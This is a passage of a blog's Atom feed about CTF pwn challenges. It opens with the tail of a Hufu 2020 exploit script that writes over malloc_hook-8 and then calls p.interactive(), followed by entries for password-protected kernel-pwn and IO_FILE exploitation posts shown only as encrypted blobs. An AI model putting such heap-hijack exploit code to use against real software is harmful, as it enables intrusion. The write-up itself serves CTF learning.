class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>iofile利用</title>
    <link href="https://nocbtm.github.io/2020/04/15/iofile%E5%88%A9%E7%94%A8/"/>
    <id>https://nocbtm.github.io/2020/04/15/iofile利用/</id>
    <published>2020-04-15T06:35:24.000Z</published>
    <updated>2020-05-27T09:24:01.123Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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